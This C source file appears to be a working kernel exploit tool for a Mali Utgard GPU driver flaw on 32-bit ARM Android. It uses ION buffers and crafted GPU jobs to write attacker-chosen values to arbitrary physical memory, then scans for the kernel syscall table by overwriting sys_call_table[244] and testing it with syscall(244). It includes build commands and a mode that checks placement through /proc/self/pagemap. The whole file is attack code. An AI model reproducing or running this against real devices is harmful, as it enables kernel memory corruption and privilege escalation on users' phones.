/*
 * gpu_scan - in-process probe loop for the Utgard arbitrary-physical-write
 *            primitive.
 *
 * For every candidate physical address it
 *   1. binds that page with the external-memory backend at EXT_VA,
 *   2. submits one PP job writing a 128-byte canary (8-byte value x 16),
 *   3. calls syscall(244) and checks whether the return value is still
 *      -ENOSYS (slot untouched) or something else (we hit sys_call_table[244]).
 *
 * The canary is an address of a harmless kernel function; if the write lands
 * in the syscall table, the slot execute it instead of sys_ni_syscall.
 *
 * Build (32-bit ARM, static):
 *   zig cc -target arm-linux-musleabihf -O1 -static -o gpu_scan gpu_scan.c
 *
 * Usage:
 *   gpu_scan bench <phys_hex> <count>
 *   gpu_scan scan  <start_hex> <end_hex> <step_hex> <canary_hex>
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define ION_IOC_ALLOC 0xc0144900u
#define ION_IOC_SHARE 0xc0084904u

#define MALI_IOC_MEM_BIND 0xc0288302u
#define MALI_IOC_PP_START_JOB 0xc1988400u
#define MALI_IOC_WAIT_NOTIF 0xc0688202u

#define CMD_VA 0x20000000u
#define EXT_VA 0x40000000u
#define ION_HEAP_SYSTEM 1u
#define BIND_EXTERNAL (1u << 11)
#define PIXFMT_WB_128 0x06

struct ion_alloc { uint32_t len, align, heap_mask, flags, handle; };
struct ion_fd { uint32_t handle; int32_t fd; };
struct mali_bind {
    uint64_t ctx;
    uint32_t vaddr, size, flags, padding;
    uint32_t phys_addr, rights, ext_flags, pad2;
};

static void put32(void *b, unsigned off, uint32_t v)
{
    *(uint32_t *)((char *)b + off) = v;
}
static void put64(void *b, unsigned off, uint64_t v)
{
    *(uint64_t *)((char *)b + off) = v;
}

static int mali_fd = -1, ion_fd = -1, cmd_fd = -1;
static void *cmd_buf;

static void build_shader(void)
{
    uint32_t *c = (uint32_t *)cmd_buf;
    fprintf(stderr, "[.] cmd_buf=%p\n", cmd_buf); memset(cmd_buf, 0, 0x1000); fprintf(stderr, "[.] memset 4k ok\n");
    c[0] = 0;
    c[1] = 0xB8000000u;
    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
    c[3] = 0xB0000000u;
    c[4] = 0;
    c[5] = 0xBC000000u;
    c[6] = 0;
    c[7] = 0;
}

static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
{
    unsigned char b[8];
    memcpy(b, &val, 8);
    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
          ((uint32_t)b[3] << 24);
    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
          ((uint32_t)b[7] << 24);
}

static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
                       uint32_t word0)
{
    struct mali_bind b;
    memset(&b, 0, sizeof b);
    b.vaddr = vaddr;
    b.size = size;
    b.flags = flags;
    b.phys_addr = word0;
    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
}

/* Open a session and map the command buffer into it. */
static int session_open(void)
{
    fprintf(stderr, "[.] session_open\n");
    if (mali_fd >= 0)
        close(mali_fd);
    mali_fd = open("/dev/mali", O_RDWR);
    if (mali_fd < 0)
        return -1;
    fprintf(stderr, "[.] bind cmd buf\n");
    if (bind_region(CMD_VA, 0x4000, 0x200 /* DMA_BUF */, (uint32_t)cmd_fd) < 0) {
        close(mali_fd);
        mali_fd = -1;
        return -1;
    }
    fprintf(stderr, "[.] bind ret ok, build_shader\n");
    build_shader();
    fprintf(stderr, "[.] shader built\n");
    return 0;
}

/* One 128-byte write-back burst of `val` at physical page `phys`. */
static int gpu_submit(uint32_t dest, uint64_t val)
{
    uint32_t c0, c1;
    encode_value(val, &c0, &c1);

    static volatile uint32_t done;
    uint8_t job[408];
    memset(job, 0, sizeof job);
    done = 0;

    put64(job, 8, 0x7777);
    put32(job, 20, CMD_VA);
    put32(job, 24, CMD_VA + 0x1000);
    put32(job, 32, 0x02);
    put32(job, 44, c0);
    put32(job, 48, c1);
    put32(job, 52, c0);
    put32(job, 56, c1);
    put32(job, 68, CMD_VA + 0x2000);
    put32(job, 72, (0x400u << 16) | 0x400u);
    put32(job, 84, 1);
    put32(job, 88, 1);
    put32(job, 92, 0x77);
    put32(job, 96, 1);
    put32(job, 104, 0xE0C);
    put32(job, 108, 0x8888);
    put32(job, 168, 0x02);
    put32(job, 172, dest);
    put32(job, 176, PIXFMT_WB_128);
    put32(job, 188, 0);
    put32(job, 200, 0);
    put32(job, 328, 1);
    put32(job, 352, 0);
    put32(job, 396, (uint32_t)-1);
    put64(job, 400, (uint64_t)(uintptr_t)&done);

    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
        return -1;

    uint8_t notif[104];
    memset(notif, 0, sizeof notif);
    if (ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif) < 0)
        return -1;
    return 0;
}

static double now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

/* Write 128 bytes of `val` at physical `phys`.  Returns 0, or -1 if the
 * session had to be recreated (caller retries). */
static int probe_write(uint32_t phys, uint64_t val)
{
    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
        return -1;
    if (gpu_submit(EXT_VA + (phys & 0xfffu), val) < 0)
        return -1;
    return 0;
}

static int setup_ion(void)
{
    ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { perror("open /dev/ion"); return -1; }

    struct ion_alloc a;
    memset(&a, 0, sizeof a);
    a.len = 0x4000;
    a.align = 0x1000;
    a.heap_mask = ION_HEAP_SYSTEM;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) { perror("ion alloc"); return -1; }
    fprintf(stderr, "[.] ion alloc ok\n");

    struct ion_fd f;
    f.handle = a.handle;
    f.fd = -1;
    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) { perror("ion share"); return -1; }
    cmd_fd = f.fd;

    fprintf(stderr, "[.] ion share ok fd=%d\n", cmd_fd);
    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, cmd_fd, 0);
    if (cmd_buf == MAP_FAILED) { perror("mmap cmd"); return -1; }
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr, "usage: %s bench <phys> <count>\n"
                        "       %s scan <start> <end> <step> <canary>\n",
                argv[0], argv[0]);
        return 1;
    }
    if (setup_ion() < 0)
        return 1;
    if (session_open() < 0) { perror("mali session"); return 1; }

    if (!strcmp(argv[1], "bench")) {
        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
        int n = atoi(argv[3]);
        uint64_t val = 0x1122334455667788ULL;
        double t0 = now_ms();
        for (int i = 0; i < n; i++) {
            if (probe_write(phys, val) < 0) {
                if (session_open() < 0) { printf("session reopen failed at %d\n", i); return 1; }
                i--; continue;
            }
        }
        double dt = now_ms() - t0;
        printf("%d writes in %.1f ms = %.2f ms/write (%.0f writes/s)\n",
               n, dt, dt / n, n * 1000.0 / dt);
        return 0;
    }

    if (!strcmp(argv[1], "place")) {
        /* Bind a page we own at an arbitrary *offset* inside it through the
         * external-physical backend and report exactly what changed.  This is
         * the end-to-end check of "does page+offset really land there". */
        uint32_t off = (argc >= 3) ? (uint32_t)strtoul(argv[2], NULL, 16) : 0x7a0;
        int fd = open("/data/local/tmp/place.bin", O_RDWR | O_CREAT, 0644);
        if (fd < 0) { perror("open place.bin"); return 1; }
        if (ftruncate(fd, 0x1000) < 0) { perror("ftruncate"); return 1; }
        unsigned char *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                 MAP_SHARED, fd, 0);
        if (pg == MAP_FAILED) { perror("mmap"); return 1; }
        memset(pg, 0xAA, 0x1000);

        int pm = open("/proc/self/pagemap", O_RDONLY);
        if (pm < 0) { perror("pagemap"); return 1; }
        uint64_t e = 0;
        if (pread(pm, &e, 8, ((off_t)(uintptr_t)pg / 0x1000) * 8) != 8) {
            perror("pread pagemap"); return 1;
        }
        uint64_t pfn = e & ((1ULL << 55) - 1);
        uint32_t phys = (uint32_t)(pfn << 12);
        printf("page phys=0x%x  writing at +0x%x (0x%x)\n", phys, off, phys + off);

        const uint64_t val = 0x1122334455667788ULL;
        if (probe_write(phys + off, val) < 0) {
            if (session_open() < 0) { printf("session reopen failed\n"); return 1; }
            if (probe_write(phys + off, val) < 0) { printf("write failed\n"); return 1; }
        }

        int first = -1, last = -1, changed = 0;
        for (uint32_t i = 0; i < 0x1000; i++) {
            if (pg[i] != 0xAA) {
                if (first < 0) first = (int)i;
                last = (int)i;
                changed++;
            }
        }
        printf("changed [0x%x..0x%x] count=%d  (asked 0x%x..0x%x)\n",
               first, last, changed, off, (unsigned)(off + 127));
        int ok = (first == (int)off) && (last == (int)off + 127) && (changed == 128);
        printf("%s\n", ok ? "PLACEMENT OK" : "PLACEMENT MISMATCH");
        return ok ? 0 : 2;
    }

    if (!strcmp(argv[1], "scan")) {
        if (argc < 6) { fprintf(stderr, "scan needs start end step canary\n"); return 1; }
        uint32_t cur = (uint32_t)strtoul(argv[2], NULL, 16);
        uint32_t end = (uint32_t)strtoul(argv[3], NULL, 16);
        uint32_t step = (uint32_t)strtoul(argv[4], NULL, 16);
        uint64_t canary = strtoull(argv[5], NULL, 16);
        long n = 0;
        double t0 = now_ms();

        while (cur < end) {
            if (probe_write(cur, canary) < 0) {
                if (session_open() < 0) {
                    printf("FATAL session reopen failed at 0x%x\n", cur);
                    return 1;
                }
                continue; /* retry the same address with a fresh session */
            }

            unsigned long r = (unsigned long)syscall(244, 0UL, 0UL, 0UL);
            n++;
            if (r != (unsigned long)-1) {
                printf("\nHIT 0x%08x -> syscall(244) ret=0x%lx\n", cur, r);
                return 0;
            }
            if ((n % 200) == 0) {
                double dt = now_ms() - t0;
                printf("... 0x%08x  %ld probes  %.1f ms/probe\n", cur, n, dt / n);
            }
            cur += step;
        }
        double dt = now_ms() - t0;
        printf("DONE 0x%x probes=%ld %.1f ms/probe (no hit)\n",
               end, n, dt / (n ? n : 1));
        return 2;
    }

    fprintf(stderr, "unknown mode\n");
    return 1;
}



